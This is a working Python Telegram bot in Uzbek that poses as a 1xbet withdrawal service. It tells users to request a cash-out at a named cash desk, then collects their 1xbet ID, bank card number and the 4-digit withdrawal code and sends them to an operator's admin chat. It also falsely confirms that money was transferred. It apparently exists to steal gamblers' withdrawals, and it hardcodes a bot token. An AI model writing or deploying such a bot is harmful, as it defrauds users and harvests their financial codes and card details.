from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from datetime import datetime

TOKEN = "7250586844:AAGv-qh10O_SUZjE4eGodSwdPc63_Be0QhE"
ADMIN_CHAT_ID = 5258395757
user_data = {}
pending_withdrawals = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💰 Hisob to‘ldirish", callback_data="deposit")],
        [InlineKeyboardButton("📤 Pul chiqarish", callback_data="withdraw")],
        [InlineKeyboardButton("👨‍💼 Aloqa", callback_data="contact")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Assalomu alaykum, hush kelibsiz! Kerakli menyuni tanlang 👇", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "withdraw":
        chat_id = query.message.chat.id
        user_data[chat_id] = {"step": "get_id"}
        await query.message.reply_text(
            "⚠️Oldin Shu manzilga ariza yarating va maxsus (4 talik) kod oling\n(SHAXAR: Oltiariq, KO‘CHA: Remax24/7)\n\n🆔ID raqamingizni kiriting...👇")

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat.id
    text = update.message.text

    if chat_id not in user_data:
        return

    step = user_data[chat_id].get("step")

    if step == "get_id":
        user_data[chat_id]["id"] = text
        user_data[chat_id]["step"] = "get_card"
        await update.message.reply_text("Ajoyib! Pul qabul qilish uchun karta raqamingizni kiriting")

    elif step == "get_card":
        user_data[chat_id]["card"] = text
        user_data[chat_id]["step"] = "get_code"
        await update.message.reply_text("1xbet tomonidan berilgan 4 talik kodni kiriting")

    elif step == "get_code":
        user_data[chat_id]["code"] = text
        user_data[chat_id]["step"] = "done"

        time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_info = user_data[chat_id]

        msg = (
            "✅Arizangiz muvoffaqiyatli qabul qilindi !\n\n"
            f"💳Karta: {user_info['card']}\n"
            f"🆔1xbet ID: {user_info['id']}\n"
            f"#️⃣4 talik kod: {user_info['code']}\n\n"
            f"📆Vaqt: {time_now}\n\n"
            "Pul kartangizga tez orada o'tkaziladi\n"
            "Iltimos sabrli bo'ling. Pul 10 daqiqadan 10 soatgacha yuboriladi. Sabr-toqatingiz uchun rahmat!\n\n"
            "Bosh sahifaga qaytish - /start"
        )

        await update.message.reply_text(msg)

        # Adminga xabar yuborish
        keyboard = [
            [
                InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_{chat_id}"),
                InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{chat_id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        admin_msg = (
            "📥 Yangi pul chiqarish so‘rovi\n"
            f"💳Karta: {user_info['card']}\n"
            f"🆔1xbet ID: {user_info['id']}\n"
            f"#️⃣4 talik kod: {user_info['code']}\n"
            f"📆Vaqt: {time_now}"
        )

        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_msg, reply_markup=reply_markup)
        pending_withdrawals[chat_id] = user_info

async def admin_action_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    if data.startswith("approve_"):
        user_id = int(data.split("_")[1])
        await context.bot.send_message(chat_id=user_id, text="✅ So‘rovingiz ko‘rib chiqildi va pul hisobingizga o‘tkazildi!")
        await query.edit_message_text("So‘rov tasdiqlandi.")
    elif data.startswith("reject_"):
        user_id = int(data.split("_")[1])
        await context.bot.send_message(chat_id=user_id, text="❌ So‘rovingiz rad etildi. Iltimos admin bilan bog‘laning: @Xbetkassauz1")
        await query.edit_message_text("So‘rov rad etildi.")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^withdraw$"))
    app.add_handler(CallbackQueryHandler(admin_action_handler, pattern="^(approve|reject)_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    app.run_polling()
